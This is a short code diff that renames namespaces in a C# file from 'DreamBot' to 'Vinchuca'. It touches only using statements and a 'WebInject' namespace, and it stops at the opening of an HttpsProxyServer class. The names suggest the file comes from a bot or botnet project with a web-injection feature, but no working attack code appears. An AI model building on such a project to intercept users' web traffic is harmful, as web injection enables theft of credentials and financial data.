@@ -1,9 +1,9 @@
 ﻿using System.Collections.Generic;
-using DreamBot.Network.Comunication.TCP;
-using DreamBot.Network.Listeners;
-using TcpListener = DreamBot.Network.Comunication.Listeners.TcpListener;
+using Vinchuca.Network.Comunication.TCP;
+using Vinchuca.Network.Listeners;
+using TcpListener = Vinchuca.Network.Comunication.Listeners.TcpListener;
 
-namespace DreamBot.Actions.WebInject
+namespace Vinchuca.Actions.WebInject
 {
     public class HttpsProxyServer
     {
